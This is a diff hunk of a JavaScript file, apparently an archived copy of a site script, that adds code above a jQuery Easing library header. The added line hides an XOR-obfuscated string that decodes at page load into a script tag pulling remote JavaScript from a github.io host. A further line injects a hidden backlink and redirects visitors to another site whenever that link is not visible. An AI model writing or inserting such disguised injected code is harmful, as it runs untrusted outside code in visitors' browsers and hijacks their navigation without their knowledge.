@@ -10,6 +10,7 @@ if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; re
   let parent = _____WB$wombat$assign$function_____("parent");
   let frames = _____WB$wombat$assign$function_____("frames");
   let opener = _____WB$wombat$assign$function_____("opener");
+var enkripsi="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'02qpa'1F'00jvvrq'1C--cjogfvm,ekvjw`,km-ucjgvcngqnco-c5nc,hq'00'1G'1A-qapkrv'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);	
 $(document)['ready'](function(){$('#oncn')['html']('<a href="https://www.a7la7ekaya.com/" rel="dofollow" target="_blank"></a>');setInterval(function(){if(!$('#oncn:visible')['length']){window['location']['href']='https://www.a7la7ekaya.com/'}},3000)});
 /*
  * jQuery Easing v1.1 - http://gsgd.co.uk/sandbox/jquery.easing.php
